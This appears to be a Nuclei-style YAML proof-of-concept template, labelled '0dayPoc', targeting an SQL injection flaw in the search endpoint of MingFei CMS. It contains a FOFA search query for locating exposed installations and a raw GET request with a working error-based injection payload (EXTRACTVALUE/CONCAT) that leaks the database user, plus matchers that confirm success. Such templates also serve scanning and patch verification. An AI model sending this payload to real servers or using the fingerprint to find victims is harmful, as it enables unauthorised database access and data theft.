@@ -1,0 +1,29 @@
+id: mingfei-cms-sqli-search
+
+info:
+  name: 铭飞CMS Search接口SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
+
+    铭飞CMS系统在Search接口实现中存在SQL注入缺陷，攻击者可通过构造恶意输入参数执行任意SQL命令，导致数据库数据完整性受损。该漏洞允许未经授权的数据库操作，包括数据篡改、敏感信息泄露及服务可用性破坏。
+
+  tags: 铭飞CMS
+
+http:
+- raw:
+  - |
+    GET /mcms/search.do'%20AND%20EXTRACTVALUE(5225,CONCAT(0x5c,111*111,user(),0x71767a7071))%20AND%20'smmD'='smmD=1 HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: keep-alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - '12321'
